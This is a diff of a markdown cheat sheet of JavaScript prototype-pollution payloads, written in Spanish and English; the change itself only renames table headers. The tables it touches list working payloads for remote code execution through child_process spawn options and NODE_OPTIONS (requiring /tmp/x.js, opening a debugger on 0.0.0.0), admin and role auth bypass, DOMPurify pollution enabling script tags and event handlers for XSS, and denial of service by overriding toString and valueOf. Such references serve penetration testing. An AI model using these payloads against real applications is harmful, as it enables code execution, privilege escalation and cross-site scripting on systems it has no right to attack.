@@ -23,7 +23,7 @@ linked:
 
 ## RCE via child_process (Server)
 
-| **Gadget** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | child_process.spawn options | `{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /tmp/x.js"}}` | Pollute `shell` o `NODE_OPTIONS` de spawn. |
 | `NODE_OPTIONS` env injection | `{"__proto__":{"env":{"NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229"}}}` | Activate debug mode → RCE via debugger. |
@@ -58,7 +58,7 @@ ___
 
 ## Auth Bypass
 
-| **Gadget** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | isAdmin flag global | `{"__proto__":{"isAdmin":true}}` | Backend que verifica `if(user.isAdmin)`. |
 | role injection | `{"__proto__":{"role":"admin"}}` | Variant de isAdmin. |
@@ -93,7 +93,7 @@ ___
 
 ## XSS via Gadget en Sanitizer
 
-| **Gadget** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | DOMPurify config pollution | `{"__proto__":{"ALLOWED_ATTR":["onerror","onload"]}}` | Allow XSS attrs. |
 | DOMPurify ALLOWED_TAGS | `{"__proto__":{"ALLOWED_TAGS":["script"]}}` | Allow script tag. |
@@ -110,7 +110,7 @@ ___
 
 ## DoS / Property Override
 
-| **Gadget** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Override toString | `{"__proto__":{"toString":""}}` | Cualquier `.toString()` rompe. |
 | Override valueOf | `{"__proto__":{"valueOf":""}}` | Comparaciones rompen. |
@@ -128,7 +128,7 @@ ___
 
 ## Property Injection que Cambia Logic
 
-| **Gadget** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Default values injection | `{"__proto__":{"timeout":10000}}` | Cambia timeouts. |
 | Feature flag toggle | `{"__proto__":{"betaFeatures":true}}` | Habilita features hidden. |
